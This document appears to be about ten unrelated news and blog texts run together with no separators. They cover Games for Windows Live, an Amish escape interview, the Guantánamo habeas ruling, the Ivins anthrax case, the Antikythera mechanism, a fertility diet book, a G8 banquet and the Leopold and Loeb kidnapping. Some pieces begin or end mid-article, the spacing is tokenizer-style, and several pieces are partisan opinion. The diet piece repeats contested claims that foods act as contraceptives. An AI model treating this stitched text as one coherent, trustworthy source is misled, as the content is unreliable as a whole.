Designed in the mold of the company 's Xbox Live console multiplayer service , Games for Windows Live was previously available in similar free Silver and paid Gold tiered options .
However , as Microsoft considers both programs part of the same network , Gold subscribers of either Xbox Live or Games for Windows Live have always had full access to both .
Top Al - Qaeda Leader Killed in Pakistan ?
A Pakistani intelligence agent is reporting that a top Al - Qaeda leader was killed in a US air strike in Pakistan .
This is the man rumored to be a chemical and biological weapons expert , and appears to be a high profile target .
The United States has yet to confirm the identity of the victim .
We have had reports of major targets being killed before only to find out that they were unfounded , so who knows if this is true , we will just have to wait and see .
If it is true it is a major “ get ” for the United States and I find it ironic that it happened just as President Obama was finishing his “ America will surrender after I become president ” world tour .

This is the final continuation of Part 1 , where Torah Bontrager — who escaped the Old Order Amish culture to attend Columbia University — explained common misconceptions and myths about the Amish , as well as the pros and cons of being raised in this alternative American culture .
Here we chronicle the actual escape …
This two - part piece is not intended to generalize all Amish .
It is a chronicle of one person ’s experiences with the common constraints and abuses of the Old Order Amish , leading to escape .
Please see Torah ’s follow - up comments here for more important details .
How did you finally escape ?
I had three paternal uncles who left when they were young .
One of them lived in Montana .
I ’d only met him once , when I was eleven , but I just knew he would be the one to help me escape .
We were allowed to have phones in the barn ( you ’d go to hell with a phone in the house , but God was cool with it in the barn , apparently ) .
One day , when I was fourteen , I sneaked into my dad ’s desk , copied down my Montana uncle ’s number , and called him collect .
I knew that whatever long - distance number you dialed showed up on the phone bill unless you called collect .
For about a year , I ’d wait until everyone in the house was fast asleep , then I ’d sneak down the stairs .
Believe me , I knew every creak and groan in the staircase and how to avoid them — I also sprayed WD - 40 on the door hinges and the window .
I ’d crawl out the bathroom window after flushing the toilet to cover the sound and run outside to the barn .
Then I ’d call my uncle and we ’d talk .
Of course , he said I could stay with him .
There was still the problem of the law , though — my parents could just scoop me back up .
My dad got the daily paper , and my mom caught me reading it once .
She beat me for what she deemed open signs of rebellion .
Following that , I ’d wait until my mom took her nap and then I ’d read the paper from cover to cover .
One day , when I was fifteen , the front - page article covered the case of a sixteen - year - old boy who essentially divorced his parents .
He was awarded limited emancipation because of having been abused by them .
The article said that you could get emancipated based on physical , verbal or sexual abuse , educational deprivation , and a few other conditions as well .
If you were emancipated , you had all the rights of an eighteen - year - old .
The instant I read it , I thought “ Ah , ha !
This is how I can leave before I ’m eighteen and go to high school . ”
So I called my uncle .
He had n’t heard of the case , but he called his attorney and luckily , Montana was one of the handful of states where the new law was in effect .
So I could leave Michigan to live in Montana to be a free person .
Then I just needed a plan .
How did it all come together ?
One night , I was talking to one of my three uncles , who lived in Wisconsin , and I told him that I could n’t stand being Amish anymore , that I ’d had it , and that — if I could — I ’d leave that night .
Then he said something I was n’t expecting at all —
“ Well , if I drove over tonight to pick you up , would you go ? ”
I called my Montana uncle and told him I ’d be leaving that night .
I took my birth certificate , Social Security Number and vaccination record out of my dad ’s safe ( my Montana uncle had told me I ’d need these for going to high school ) .
I packed two small boxes to take with me , which contained all the worldly possessions dear to me .
You ca n’t imagine what an ordeal it was to go down those god-awful creaky stairs ( even the wonders of WD - 40 could n’t save that old staircase ) , cross over the god - awful creaky dining room floor , slip through the god -awful creaky kitchen door , all the time doing everything I could to keep from just making a dash for the door .
Luckily , the fridge — yes , we were allowed to have fridges — kicked in just when I was trying to figure out how to cover the noise of the kitchen door .
I had so much adrenaline rushing through my blood that I was losing control of myself .
The only thing I could think of during those last few moments was that the other side of the door was freedom .
Outside .
Freedom was so close , I could smell it .
I tore across the yard , heading straight toward the road .
I ran about a quarter mile down the road until I reached the creek where my uncle was designated to wait for me .
I stopped only once , for just a second , to look back .
I debated whether I wanted to look back — I was afraid I ’d jinx myself if I did — but then I thought : this is a huge moment in my life and I want to take just one more look at the homestead .
I paused , turned around and looked .
Everything was quiet .
No movement , no noise , no lights on in the house , nothing .
I was safe .
No one knew I was n’t up in my room sound asleep .
I took off again as fast as I could to where my uncle ’s car was parked .
He was n’t there !
He must have come and gone without me !
My heart almost stopped .
Then I saw a little light from the car door opening .
He had parked off the road .
I ran towards the car , jumped in the front passenger seat , and we were off .
It was about an 8 - hour drive to Wisconsin where he and his family lived .
I spent two days with them .
My aunt took me shopping for clothes .
I ’ll never forget the first time I wore a pair of jeans .
I could n’t believe how comfortable they were .
I also got my picture taken , the only photo I have of me in Amish clothes .
On the second day , they put me on the train out to my Montana uncle .
In two days , I was in Montana .
I was free , and my new life began .
Why do you want people to know your story ?
Because the general public is not properly educated about what goes on inside the Amish , which it makes it a million times harder for individuals ( especially women and children ) to receive the assistance they need , whether that ’s before or after they leave .
What continues to make it even worse are people like me — someone who is Amish and has the resources and know - how available — who does nothing about it .
It ’s bothered me ever since , so I ’ve decided to speak up now and spread awareness about this issue .

In the times of our parents and their parents , the need to save money was taken for granted .
Debt was something undertaken for big purchases , such as houses , cars , and appliances .
Most importantly , and this is something you ’ll see if you watch an old movie , people stopped going out socially when they ran out of money .
Now , in the miracle age of convenience , we ’re not troubled by many worries .
It ’s become more and more convenient to access our money and credit .
In fact , it ’s so convenient that retailers seem eager to subtract as much unnecessary waiting as possible , and that includes the time we used to use to think .
That ’s right ; our brains are an obstacle in the ultimate retail equation .
As a society , we recognize that impulse buying can be dangerous .
Many states and countries have waiting periods for the purchase of firearms and other weapons .
We know that an impulse purchase of a gun while in the wrong state of mind can be dangerous for a person and society in general .
But , when we look at the catastrophe that sub - prime mortgages have caused , where people have bought houses that they truly could n’t afford , can we honestly say that guns are the only purchase that can damage society ?
It used to be that to spend money , we ’d need to stand in line at the bank to withdraw what we ’d want , or right a check and balance our checkbook .
Now , it ’s as easy as whipping out a card .
They ’re making it easier too !
I just received a credit card with a microchip that means I wo n’t even need to sign many receipts .
Many marketers and retailers appeal to our basic impulses rather than our sense of logic .
This is n’t deceitful ; it ’s just how they ’ve chosen to market their goods .
While it might feel good to satisfy your immediate impulse while shopping , you ultimately benefit more by thinking in longer terms .
Here are a few ways to defeat the urge to impulse shop :
1. Shop with a list .
Your brain can also be satisfied with the hunt for items .
If you go in with a list and then leave , you ’ll find that you get less temptation than a wander through store aisles might provide .
Shopping with purpose cuts through most impulse urges , while shopping as a distraction opens you up to them .
2. Leave your cards at home .
If you do n’t have access to money , you ’re less likely to spend it .
Bring enough to get what you need .
Some people actually freeze their credit cards in a block of ice .
It ensures a waiting period before use .
3 . Do your research online .
If you know what you ’re looking for and know the details , you ’re less likely to be swayed by a last minute deal or a good salesperson .
Remember , while satisfying an impulse might feel good for a moment , being in complete control of your finances feels good for a much longer time .
So control your money , do n’t let it control you .

US Supreme Court upholds habeas corpus for Guantánamo Bay prisoners
By John Burton
13 June 2008
The United States Supreme Court ruled 5 - 4 Thursday that prisoners held as “ enemy combatants ” at Guantánamo Bay , Cuba can immediately file habeas corpus petitions in US district courts challenging the legality of their confinement .
Most have been held at the US naval base under brutal conditions , enduring solitary confinement and torture , for more than six years .
None has ever had the merits of his case reviewed by a court of law .
The majority opinion in the case , Boumediene et al v. Bush , was authored by Justice Anthony Kennedy , considered the “ swing ” vote on the court , and joined by the four high court liberals — John Paul Stevens , Ruth Bader Ginsburg , David Souter and Stephen Breyer .
The ruling does not question the executive branch ’s ability to declare someone an “ enemy combatant , ” an unprecedented power the Supreme Court upheld four years ago in Hamdi v. Rumsfeld .
( See “ The meaning of the US Supreme Court rulings on ‘ enemy combatants ’ ” )
Nor does Kennedy order the release of any prisoner .
Nevertheless , Kennedy ’s opinion is a rebuke to a cornerstone of the Bush administration ’s so - called “ global war on terror . ”
By holding unconstitutional the provision of the 2006 Military Commissions Act ( MCA ) stripping Guantánamo Bay prisoners of their habeas corpus rights , the Supreme Court has stopped the Bush administration from continuing to use the naval base as a legal limbo , where it can imprison people indefinitely without regard for either domestic or international law .
“ Within the Constitution ’s separation - of - powers structure , few exercises of judicial power are as legitimate or as necessary as the responsibility to hear challenges to the authority of the Executive to imprison a person , ” Kennedy wrote for the majority , underlining the importance of the decision for the continued credibility of the judiciary .
“ Some of these petitioners have been in custody for six years with no definitive judicial determination as to the legality of their detention . ”
The four right - wing justices joined together in two particularly vicious dissents , one authored by Chief Justice John Roberts and the other by Associate Justice Antonin Scalia , who all but labeled Kennedy a traitor , stating that his opinion “ will almost certainly cause more Americans to be killed . ”
In Hamdi , a highly fractured court — none of the opinions received a majority vote — ordered that the government establish tribunals to determine whether individuals are in fact “ enemy combatants . ”
That same day the court also decided Rasul v. Bush , recognizing that Guantánamo prisoners were entitled to file petitions for habeas corpus under the terms of the congressional Habeas Corpus Act .
In response , Bush administration lawyers established Combat Status Review Tribunals ( CSRTs ) — kangaroo courts where prisoners are denied lawyers and , in most cases , access to the evidence against them — and Congress passed the Detainee Treatment Act ( DTA ) , which revoked habeas corpus for Guantánamo prisoners , giving them access to US courts only for a cursory review of whether CSRT procedures were followed correctly .
In June 2006 the Supreme Court decided in Hamdan v. Rumsfeld that the DTA ’s ban on habeas petitions did not apply to those already filed .
The Bush administration , with the complicity of key congressional Democrats , rammed through the Military Commissions Act ( MCA ) , which contained a provision depriving federal courts of jurisdiction over all habeas petitions filed by Guantánamo prisoners .
It was that provision the Supreme Court on Thursday held to violate the clause in the body of the Constitution which states : “ The privilege of the writ of habeas corpus shall not be suspended , unless when in cases of rebellion or invasion the public safety may require it . ”
Neither the Bush administration nor Congress invoked the so - called “ suspension ” clause of the Constitution to justify their revocation of habeas corpus rights .
Kennedy began his analysis with a review of the central role played by the writ in England , outlining its “ painstaking ” development from the reign of Edward I , through the Magna Carta , to its formal legal embodiment in the Habeas Corpus Act of 1679 , “ described by Blackstone as the ‘ stable bulwark of our liberties . ’ ”
“ The Framers viewed freedom from unlawful restraint as a fundamental precept of liberty , ” Kennedy wrote .
Thus “ habeas corpus was one of the few safeguards of liberty specified in a Constitution that , at the outset , had no Bill of Rights . ”
Because habeas corpus constitutes a judicial check on unlawful imprisonment by the executive branch , “ the Framers deemed the writ be an essential mechanism in the separation - of - powers scheme . ”
Quoting The Federalist No. 84 , Kennedy wrote , “ ‘ The practice of arbitrary imprisonments has been , in all ages , the favorite and most formidable instrument of tyranny . ’ ”
Kennedy rejected Scalia ’s principal argument — that habeas corpus rights do not extend to non-citizens outside the sovereign territory of the United States — with the observation that “ questions of extraterritoriality turn on objective factors and practical concerns , not formalism . ”
Turning to the specifics of habeas jurisdiction over Guantánamo Bay — nominal Cuban territory occupied by the United States pursuant to a $ 1 perpetual lease extracted over 100 years ago from the nascent Cuban government — Kennedy exposed the Bush administration ’s underlying quasi-legal machinations .
“ The necessary implication of the argument is that by surrendering formal sovereignty over any unincorporated territory to a third party , while at the same time entering into a lease that grants total control over the territory back to the United States , it would be possible for the political branches to govern without legal constraint . ”
According to Kennedy , this would enable the executive and legislative branches “ to switch the Constitution on or off at will . ”
Because “ the writ of habeas corpus is itself an indispensable mechanism for monitoring the separation of powers , ” Kennedy ruled that “ the test for determining the scope of this provision must not be subject to manipulation by those whose power it is designed to restrain . ”
Kennedy concluded that “ before today the Court has never held that non-citizens detained by our Government in territory over which another country maintains de jure sovereignty have any rights under our Constitution .
But the cases before us lack any precise historical parallel .
They involve individuals detained by executive order for the duration of a conflict that , if measured from September 11 , 2001 to the present , is already among the longest wars in American History ...
The detainees , moreover , are held in a territory that , while technically not part of the United States , is under the complete and total control of our Government .
Under these circumstances the lack of a precedent on point is no barrier to our holding . ”
Chief Justice Roberts began his dissent with the preposterous claim that the majority opinion “ strikes down as inadequate the most generous set of procedural protections ever afforded aliens detained by this country as enemy combatants . ”
In fact , these procedures , which include the use of “ evidence ” obtained through torture , have been denounced by civil liberties organizations in the US and around the world , and even the former chief military prosecutor at Guantánamo has called them a travesty of due process .
The current military trials of alleged 9/11 conspirators being held at Guantánamo feature tape delays of statements by the accused designed to censor their charges concerning the abuse and torture inflicted upon them as well as other revelations that might prove damaging to the US government .
One effect of Thursday ’s Supreme Court ruling may be to halt these trials indefinitely .
Roberts continued : “ The critical threshold question in these cases , prior to any inquiry about the writ ’s scope , is whether the system the political branches designed protects whatever rights the detainees may possess .
If so , there is no need for any additional process , whether called ‘ habeas ’ or something else . ”
In other words , the “ political branches ” — the executive and Congress — are free to “ design ” procedures for “ whatever rights ” they deem to exist .
This is a formula for judicial abdication and the establishment of a police state .
It is a testament to the dire state of democratic rights in the United States and the degraded condition of American democracy that a shift in a single vote on the high court would be sufficient to make such a sweeping repudiation of democratic rights the law of the land .
Scalia ’s dissent is an exercise in hysterical fear - mongering , something that would appear more suited for a Fox Cable News broadcast or talk - radio show than a high court opinion .
Both the tone and content of his opinion makes clear it was intended as an appeal to the most reactionary forces in the United States and an effort to whip up such layers against the court majority .
Despite the fact that , according to Kennedy , none of the petitioners in Boumediene et al v. Bush “ is a citizen of a nation now at war with the United States , ” and “ each denies he is a member of the Al Qaeda terrorist network that carried out the September 11 attacks or of the Taliban regime , ” Scalia claimed , “ Today , for the first time in our Nation ’s history , the Court confers a constitutional right to habeas corpus on alien enemies detained abroad by our military forces in the course of an ongoing war . ”
“ America is at war with radical Islamists , ” Scalia continued .
“ The enemy began by killing Americans and American allies abroad : 241 at the Marine barracks in Lebanon , 19 at the Khobar Towers in Dhahran , 224 at our embassies in Dar es Salaam and Nairobi , and 17 on the USS Cole in Yemen ...
On September 11 , 2001 , the enemy brought the battle to American soil , killing 2,749 at the Twin Towers in New York City , 184 at the Pentagon in Washington , DC , and 40 in Pennsylvania ...
It has threatened further attacks against our homeland ; one need only walk about buttressed and barricaded Washington , or board a plane anywhere in the country , to know that the threat is a serious one .
Our Armed Forces are now in the field against the enemy , in Afghanistan and Iraq .
Last week , 13 of our countrymen in arms were killed . ”
Besides crudely conflating legitimate acts of resistance to neo-colonial occupation forces with terrorist acts abroad , Scalia ignores the fact that there has never been a shred of evidence presented in any court of law linking any of the Guantánamo prisoners to any of these incidents .
Asserting that the majority opinion “ warps our Constitution ” by “ invoking judicially brainstormed separation - of - powers principles to establish a manipulable ‘ functional ’ test for the extraterritorial reach of habeas corpus ( and , no doubt , for the extraterritorial reach of other constitutional protections as well ) , ” Scalia concludes , “ most tragically , it sets our military commanders the impossible task of proving to a civilian court ... that evidence supports the confinement of each and every enemy prisoner . ”
In other words , the United States judiciary should turn over responsibility for deciding who belongs in jail to the military .
Scalia ’s opinion is nothing less than a demand that democratic rights in the US be lifted and police state powers be granted to the executive branch and the military under the pretext of fighting the so - called “ war on terror ” — a “ war , ” never declared by Congress , of indefinite duration and geographical scope against an essentially undefined enemy .
Besides Chief Justice Roberts , Associate Justices Clarence Thomas and Samuel Alito concurred with this justification for military dictatorship .
Both dissents were answered in a brief concurrence with Kennedy issued by Justice Souter , who wrote : “ After six years of sustained executive detentions in Guantánamo , subject to habeas jurisdiction but without any actual habeas scrutiny , today ’s decision is no judicial victory , but an act of perseverance in trying to make habeas review , and the obligation of the courts to provide it , mean something of value both to prisoners and to the Nation . ”
The court battle was led by attorneys from the Center for Constitutional Rights ( CCR ) in New York City .
“ This decision ensures that the executive does not falsely claim credit for detaining and incapacitating terrorists , when in many documented cases they have just swept up innocent men and hidden them from scrutiny , ” said CCR President Michael Ratner .
He continued : “ It rightfully discourages Congress and the President from establishing deceptive , extra-legal proceedings in times of crisis and confirms our qualms about inventing extralegal and inhumane processes to detain human beings — no matter who they are or where they come from . ”
President Bush , appearing with Prime Minister Silvio Berlusconi of Italy at a Rome press conference , said , “ We ’ll abide by the court ’s decision ” — suggesting that he had a choice .
He added , “ [ I ]t was a deeply divided court , and I strongly agree with those who dissented . ”

The government ’s central piece of evidence against Bruce Ivins is that it has found anthrax in Ivins ’ lab that matches the anthrax letters exactly .
Pretty persuasive , right ?
No , actually . . .
According to a story today in Time Magazine :
“ It is hard to understand why the match could not simply be explained by the lab ’s prominent involvement in the federal investigation , notes Randall Larsen , a retired Air Force colonel and a senior associate at the Center for Biosecurity , University of Pittsburgh Medical Center .
The FBI itself sent the anthrax letters to Ivins and his colleagues at the biodefense lab for analysis “ almost immediately ” following the attacks in 2001 , confirms Caree Vander - Linden , a spokesperson for the U.S. Army Medical Research Institute of Infectious Diseases , where Ivins worked . ”
( Article continues below )
Another government allegation turns out to be without substance .
Even if the presence of anthrax in Ivins ’ office was not so easily explainable , there were still perhaps a dozen people who had access to whatever anthrax Ivins was handling .
As the Time article points out :
“ A group of people have access to the anthrax at any given lab .
‘ What you can do with all those forensic techniques is trace the anthrax to a lab , but you ca n’t trace it to a person , ’ says Meryl Nass , a Maine doctor who studies the anthrax vaccine and was a professional acquaintance of Ivins for over 15 years .
What ’s more , Nass adds , the link is not accurate with 100 % certainty .
‘ You ca n’t convict someone with that evidence . ’ “

An ancient Greek astronomical calculator that showed the positions of the sun , Earth and the moon , and outshined any known device for 1,000 years after it , also kept track of something more mundane : when the next Olympics would take place .
And its design just might have sprung from the skull of the brilliant scientist Archimedes .
View a Slide Show of the Antikythera mechanism
Researchers have pried these and a few other fresh secrets from the corroded bronze fragments of the Antikythera mechanism , a clockwork - like assemblage discovered in 1901 by Greek sponge divers off the Greek island of Antikythera , between Kythera and Crete .
Members of the Antikythera Mechanism Research Project ( AMRP ) and their colleagues used data from high - resolution , 360 - degree x-ray scans to decipher markings as small as 0.06 inch ( 1.7 millimeters ) tall on a spiral dial on the rear of the instrument .
The five - twist spiral is inscribed with 235 sets of markings believed to indicate the months in a 19 - year calendar .
Known as the Metonic calendar , people have used it since Babylonian times to account for the fact that 12 lunar months add up to only 354 days — 11 days shy of a solar year .
( Gears located behind the dial face would have moved a pointer like the minute hand on a clock to refer a user to particular markings on the dial . )
Writing in Nature , the team was able for the first time to read the names of the months on the dial , which match those of calendars once used in the Corinthian colonies of northwestern Greece , suggesting that the mechanism was built in the area .
Seven of the month names match a calendar used in a part of Sicily believed founded by settlers from Syracuse in the fourth century B.C. Syracuse was home to Archimedes , the polymath who in one apocryphal story leaped from a bath shouting , " Eureka ! " ( I have it ) after figuring out how to tell if a royal crown was made of solid gold by submerging it in water and measuring the water it displaced .
Researchers assume that the Antikythera mechanism , built in approximately 150 to 100 B.C. , sank on its way from the Greek island of Rhodes to Rome , then a major trading route .
Although Archimedes died in 212 B.C. , too early to have built the Antikythera mechanism , the Roman philosopher Cicero attributes a device to Archimedes that was similar to it .
" There 's a chance that it 's a kind of descendent of his invention , " study author Alexander Jones , a historian of ancient science at the Institute for the Study of the Ancient World at New York University , says .
Whatever purpose Archimedes may have had in mind for his instrument , Jones says the use of the Corinthian calendar indicates that the Antikythera mechanism was not built for scientists .
Instead it may have been for teaching nonspecialists about astronomy .
Bolstering that interpretation , the researchers discovered that the markings on a smaller dial inside the Metonic one spelled out the locations of the names of Panhellenic games , the highly popular sporting events of which the most famous is the Olympics .
The games were on a four - year cycle , and each quarter turn of the dial indicated which games took place that year in the cycle .
" That 's something of no scientific interest .
That 's of human , social interest , " Jones says .
One of the things the mechanism was well - suited to teach was the predictability of eclipses — the apparent task of a second , four - twist spiral dial on the instrument 's back .
Its 223 divisions correspond to months in the Saros cycle , another ancient calendar system — this one an 18 - year cycle — for tracking eclipses .
Of these divisions , researchers had previously identified 16 that were marked with glyphs , or sets of characters , indicating solar and lunar eclipses .
The team increased that number by two to 18 .
The pattern of glyphs was highly accurate : it matched the start dates of 100 eclipses that occurred during the final four centuries BC , as determined by NASA .
" We could start the dial at any of these dates and all the known glyphs would exactly match actual eclipses , " says study author Tony Freeth of Cardiff , Wales , a former mathematician and member of the AMRP .
The device seems to have fallen short , however , in predicting the exact hour of an eclipse .
An inner dial is divided into three sections that may have specified the number of hours to add to the eclipse time marked on the glyph .
But the authors were unable to figure out a way to make the times match those of the eclipses calculated by NASA .
They suspect that the device 's maker used an imprecise method for calculating those times .
The shortcoming does not diminish the brilliance of the Antikythera mechanism , which " has at its heart a real genius about it , " Freeth says .
Of particular ingenuity , he says , is a pin and slot mechanism involved in the front side of the instrument , which shows the positions of sun , Earth and moon .
Freeth and his colleagues reported two years ago that the pin and slot were used to account for variations in the speed of the moon in the sky .
One can almost hear the inventor of that little trick shouting , " Eureka ! "
Can changing your diet help you have a baby in your 40s ?
Drastic changes in diet boost a woman 's chances of giving birth into her 40s and 50s , it is claimed .
Alterations from cutting out alcohol and sugar to eating more organic foods allow women to hit the ' snooze button ' on their biological clocks , maximising their chances of having a baby , says a new book on fertility .
Sarah Dobbyn , a nutritionist and author of The Fertility Diet , said the influence of diet on fertility is often overlooked in an age in which IVF often seems the only answer to pregnancy problems .
A new book claims drastic changes in diet can boost a woman 's chances of giving birth into her 40s and 50s
She said : ' Huge amounts of money are being spent on assisted conception techniques by hopeful couples who do not know that alcoholic and caffeinated beverages are liquid contraceptives , sweeteners can prevent ovulation and seemingly innocent foods such as peas , rhubarb and soya all inhibit fertility . '
Aimed at those trying to conceive naturally , as well as those going through IVF , The Fertility Diet sets out a diet and lifestyle plan which should be followed by both partners .
The most comprehensive guide of its kind , it advises cutting out smoking , artificial sweeteners , alcohol , caffeine and soya in the first month .
Peas and rhubarb are also banned , following studies linking them to infertility .
By month two , couples should have given up all meat and cut out sugar and dairy products .
Come the third month , consumption of eggs and fruit juices should be reduced .
However , it is not all about cutting back , with couples allowed unlimited quantities of beans , pulses , organic herbs , spices and nuts from day one .
Fruit and vegetables should be eaten raw wherever possible to help balance the body 's hormones .
Would - be parents are also advised to lose weight if overweight , keep stress to a minimum , and try to get a good night 's sleep .
Miss Dobbyn , who spent two - and - a - half years combing research papers and books on fertilty to write The Fertility Diet , believes the advice will help all older couples , bar those who need surgery or other medical treatment , to conceive .
The 43 - year - old former barrister who is engaged and plans to start trying for a family soon , said : ' It is a pain to give up caffeine , it is a pain to give up wine , but wo n't it be worth it when you have your own baby ? '
However IVF doctors questioned how effective the meat and dairy - free diet would be .
Professor Bill Ledger , a fertility expert from Sheffield University , said lifestyle did not have a major effect on fertility and he was unaware of any evidence that vegans go through menopause at a different time to other women .
He added : ' We tend to create a lot of guilt in people these days .
' The worry is that some gullible young woman will read this book and start living that life and miss out on a lot of fun and normality . '
Summit that 's hard to swallow - world leaders enjoy 18 - course banquet as they discuss how to solve global food crisis
Just two days ago , Gordon Brown was urging us all to stop wasting food and combat rising prices and a global shortage of provisions .
But yesterday the Prime Minister and other world leaders sat down to an 18 - course gastronomic extravaganza at a G8 summit in Japan , which is focusing on the food crisis .
The dinner , and a six - course lunch , at the summit of leading industrialised nations on the island of Hokkaido , included delicacies such as caviar , milkfed lamb , sea urchin and tuna , with champagne and wines flown in from Europe and the U.S .
G8 leaders discussing the world food crisis in Japan raise their glasses ahead of an 18 - course dinner
But the extravagance of the menus drew disapproval from critics who thought it hypocritical to produce such a lavish meal when world food supplies are under threat .
On Sunday , Mr Brown called for prudence and thrift in our kitchens , after a Government report concluded that 4.1 million tonnes of food was being wasted by householders .
He suggested we could save up to £ 8 a week by making our shopping go further .
It was vital to reduce ' unnecessary demand ' for food , he said .
Last night 's dinner menu was created by Katsuhiro Nakamura , the first Japanese chef to win a Michelin star .
It was themed : Hokkaido , blessings of the earth and the sea .
But Dominic Nutt , of the charity Save the Children , did not approve .
' It is deeply hypocritical that they should be lavishing course after course on world leaders when there is a food crisis and millions cannot afford a decent meal , ' he said .
' If the G8 wants to betray the hopes of a generation of children , it is going the right way about it .
The food crisis is an emergency and the G8 must treat it as that .'
In 2005 , at the G8 summit in Gleneagles , Scotland , world leaders promised to increase global aid by £ 25 billion a year by 2010 and raise aid to Africa , the world 's poorest continent , by £ 12.5 billion .
But the bloc of rich nations is only 14 per cent of the way towards hitting its target .
First wives club :
The wives of the G8 leaders get stuck into the feast
The G8 Summit is addressing world food shortages
Britain is meeting its commitments in full , but other countries are understood to be dragging their feet - and there are fears the figures on global aid could be watered down .
French President Nicolas Sarkozy and Italian leader Silvio Berlusconi , who face pressure to cut spending at home , are understood to be leading the charge to weaken the Gleneagles proposal .
Tory international development spokesman Andrew Mitchell said : ' The G8 have made a bad start to their summit , with excessive cost and lavish consumption .
' Surely it is not unreasonable for each leader to give a guarantee that they will stand by their solemn pledges of three years ago at Gleneagles to help the world 's poor .
' All of us are watching , waiting and listening . '
A World Bank study released last week estimated that up to 105 million more people , including 30 million in Africa , could drop below the poverty line because of rising food prices .
Yesterday the European Union agreed to channel £ 800 million in unused European farm subsidies to African farmers , as part of its response to the global food crisis .
' The EU really can give a boost to agriculture in developing countries , ' Jose Manuel Barroso , president of the European Commission , told the meeting .
The money will be used to buy seed and fertiliser and fund agriculture projects in Africa .
The meal was served at the Windsor Hotel , on the shores of Lake Toya , where the presidential suite costs £ 7,000 a night .
Japan has spent a record sum of money and deployed about 20,000 police to seal off the remote lakeside town of Toyako for the three - day talks .
Slim pickings from the Russian leader
Britain 's relations with Russia remained chilly last night as Mr Brown held the first talks with President Dmitry Medvedev .
He is understood to have pressed for the extradition of former KGB officer Andrei Lugovoy , wanted for the London poisoning of dissident Alexander Litvinenko .
But Mr Medvedev refused to budge on that issue - or on the closure of British Council offices in Russia and arrest of its employees .
A Kremlin official said the talks had ' not avoided any sharp corners ' .
Mr Medvedev had concentrated on ' the prospects of restoring relations to the level they were on several years ago ' , he said .
Mr Brown ' brought up the issues that particularly concerned the British side , such as the British Council and activities of certain major oil companies and a number of certain - well - known cases ' , he added .
' Dmitry Medvedev gave necessary explanations and pointed to the importance of a long - term approach in UK - Russian co-operation . '
There were signs Russia may support tougher action against Robert Mugabe in Zimbabwe .
It has been reluctant to support sanctions , but British sources at the G8 summit said opposition was easing .
The G8 is expected to support a proposal of a UN envoy to broker an exit for Mugabe
Nathan Leopold was in a bad mood .
That evening , on November 10 , 1923 , he had agreed to drive with his friend and lover , Richard Loeb , from Chicago to the University of Michigan — a journey of six hours — to burglarize Loeb 's former fraternity , Zeta Beta Tau .
But they had managed to steal only $ 80 in loose change , a few watches , some penknives and a typewriter .
It had been a big effort for very little reward and now , on the journey back to Chicago , Leopold was querulous and argumentative .
He complained bitterly that their relationship was too one - sided : he always joined Loeb in his escapades , yet Loeb held him at arm 's length .
Eventually Loeb managed to quiet Leopold 's complaints with reassurances of his affection and loyalty .
And as they continued to drive along the country roads in the direction of Chicago , Loeb started to talk about his idea to carry out the perfect crime .
They had committed several burglaries together , and they had set fires on a couple of occasions , but none of their misdeeds had been reported in the newspapers .
Loeb wanted to commit a crime that would set all of Chicago talking .
What could be more sensational than the kidnapping and murder of a child ?
If they demanded a ransom from the parents , so much the better .
It would be a difficult and complex task to obtain the ransom without being caught .
To kidnap a child would be an act of daring — and no one , Loeb proclaimed , would ever know who had accomplished it .
Leopold and Loeb had met in the summer of 1920 .
Both boys had grown up in Kenwood , an exclusive Jewish neighborhood on the South Side of Chicago .
Leopold was a brilliant student who matriculated at the University of Chicago at the age of 15 .
He also earned distinction as an amateur ornithologist , publishing two papers in The Auk , the leading ornithological journal in the United States .
His family was wealthy and well connected .
His father was an astute businessman who had inherited a shipping company and had made a second fortune in aluminum can and paper box manufacturing .
In 1924 , Leopold , 19 , was studying law at the University of Chicago ; everyone expected that his career would be one of distinction and honor .
Richard Loeb , 18 , also came from a wealthy family .
His father , the vice president of Sears , Roebuck & Company , possessed an estimated fortune of $ 10 million .
The third son in a family of four boys , Loeb had distinguished himself early , graduating from University High School at the age of 14 and matriculating later the same year at the University of Chicago .
His experience as a student at the university , however , was not a happy one .
Loeb 's classmates were several years older and he earned only mediocre grades .
At the end of his sophomore year , he transferred to the University of Michigan , where he remained a lackluster student who spent more time playing cards and reading dime novels than sitting in the classroom .
And he became an alcoholic during his years at Ann Arbor .
Nevertheless he managed to graduate from Michigan , and in 1924 he was back in Chicago , taking graduate courses in history at the university .
The two teenagers had renewed their friendship upon Loeb 's return to Chicago in the fall of 1923 .
They seemed to have little in common — Loeb was gregarious and extroverted ; Leopold misanthropic and aloof — yet they soon became intimate companions .
And the more Leopold learned about Loeb , the stronger his attraction for the other boy .
Loeb was impossibly good - looking : slender but well built , tall , with brown - blond hair , humorous eyes and a sudden attractive smile ; and he had an easy , open charm .
That Loeb would often indulge in purposeless , destructive behavior — stealing cars , setting fires and smashing storefront windows — did nothing to diminish Leopold 's desire for Loeb 's companionship .
Loeb loved to play a dangerous game , and he sought always to raise the stakes .
His vandalism was a source of intense exhilaration .
It pleased him also that he could rely on Leopold to accompany him on his escapades ; a companion whose admiration reinforced Loeb 's self - image as a master criminal .
True , Leopold was annoyingly egotistical .
He had an irritating habit of bragging about his supposed accomplishments , and it quickly became tiresome to listen to Leopold 's empty , untrue boast that he could speak 15 languages .
Leopold also had a tedious obsession with the philosophy of Friedrich Nietzsche .
He would talk endlessly about the mythical superman who , because he was a superman , stood outside the law , beyond any moral code that might constrain the actions of ordinary men .
Even murder , Leopold claimed , was an acceptable act for a superman to commit if the deed gave him pleasure .
Morality did not apply in such a case .
Leopold had no objection to Loeb 's plan to kidnap a child .
They spent long hours together that winter , discussing the crime and planning its details .
They decided upon a $ 10,000 ransom , but how would they obtain it ?
After much debate they came up with a plan they thought foolproof : they would direct the victim's father to throw a packet containing the money from the train that traveled south of Chicago along the elevated tracks west of Lake Michigan .
They would be waiting below in a car ; as soon as the ransom hit the ground , they would scoop it up and make good their escape .
On the afternoon of May 21 , 1924 , Leopold and Loeb drove their rental car slowly around the streets of the South Side of Chicago , looking for a possible victim .
At 5 o'clock , after driving around Kenwood for two hours , they were ready to abandon the kidnapping for another day .
But as Leopold drove north along Ellis Avenue , Loeb , sitting in the rear passenger seat , suddenly saw his cousin , Bobby Franks , walking south on the opposite side of the road .
Bobby 's father , Loeb knew , was a wealthy businessman who would be able to pay the ransom .
He tapped Leopold on the shoulder to indicate they had found their victim .
Leopold turned the car in a circle , driving slowly down Ellis Avenue , gradually pulling alongside Bobby .
" Hey , Bob , " Loeb shouted from the rear window .
The boy turned slightly to see the Willys - Knight stop by the curb .
Loeb leaned forward , into the front passenger seat , to open the front door .
" Hello , Bob .
I 'll give you a ride . "
